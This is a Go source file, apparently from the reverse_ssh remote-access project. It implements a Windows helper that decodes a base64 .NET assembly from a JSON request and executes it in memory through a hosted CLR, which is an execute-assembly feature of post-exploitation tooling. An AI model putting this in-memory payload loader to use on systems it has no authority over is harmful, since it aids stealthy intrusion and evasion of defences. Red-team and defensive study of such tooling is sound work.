//go:build execass && windows

package engine

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"

	"github.com/NHAS/reverse_ssh/internal/client/handlers/subsystems"
	clr "github.com/Ne0nd0g/go-clr"
	"github.com/google/shlex"
)

const (
	HelperArg             = "--wrssh-execass-helper"
	maxHelperRequestBytes = int64((MaxArtifactBytes+2)/3*4 + 64*1024)
)

type HelperRequest struct {
	ArtifactBase64 string `json:"artifactBase64"`
	Runtime        string `json:"runtime"`
	AssemblyArgs   string `json:"assemblyArgs"`
}

func RunHelper(stdin io.Reader, stdout, stderr io.Writer) int {
	if err := runHelper(stdin, stdout, stderr); err != nil {
		_, _ = fmt.Fprintf(stderr, "[ERR] %v\n", err)
		return 1
	}
	return 0
}

func runHelper(stdin io.Reader, stdout, stderr io.Writer) error {
	var request HelperRequest
	decoder := json.NewDecoder(io.LimitReader(stdin, maxHelperRequestBytes+1))
	decoder.DisallowUnknownFields()
	if err := decoder.Decode(&request); err != nil {
		return fmt.Errorf("invalid helper request: %w", err)
	}

	artifact, err := base64.StdEncoding.DecodeString(request.ArtifactBase64)
	if err != nil {
		return fmt.Errorf("invalid artifact encoding: %w", err)
	}
	if len(artifact) == 0 {
		return fmt.Errorf("artifact is empty")
	}
	if int64(len(artifact)) > MaxArtifactBytes {
		return fmt.Errorf("artifact exceeds maximum size of %d bytes", MaxArtifactBytes)
	}

	parsedArgs, err := shlex.Split(request.AssemblyArgs)
	if err != nil {
		return fmt.Errorf("failed to parse assembly arguments: %w", err)
	}

	moduleIO := helperModuleIO{stdout: stdout, stderr: stderr}
	if err := initRuntimeHost(request.Runtime, moduleIO); err != nil {
		return fmt.Errorf("failed to load CLR: %w", err)
	}

	methodInfo, err := clr.LoadAssembly(runtimeHost, artifact)
	if err != nil {
		return fmt.Errorf("failed to load assembly: %w", err)
	}

	out, errText := clr.InvokeAssembly(methodInfo, parsedArgs)
	if out != "" {
		_, _ = fmt.Fprint(stdout, out)
	}
	if errText != "" {
		_, _ = fmt.Fprint(stderr, errText)
	}
	return nil
}

type helperModuleIO struct {
	stdout io.Writer
	stderr io.Writer
}

func (h helperModuleIO) Read([]byte) (int, error) {
	return 0, io.EOF
}

func (h helperModuleIO) Write(p []byte) (int, error) {
	return h.stdout.Write(p)
}

func (h helperModuleIO) Close() error {
	return nil
}

func (h helperModuleIO) Stderr() io.Writer {
	if h.stderr == nil {
		return h.stdout
	}
	return h.stderr
}

var _ subsystems.ModuleIO = helperModuleIO{}
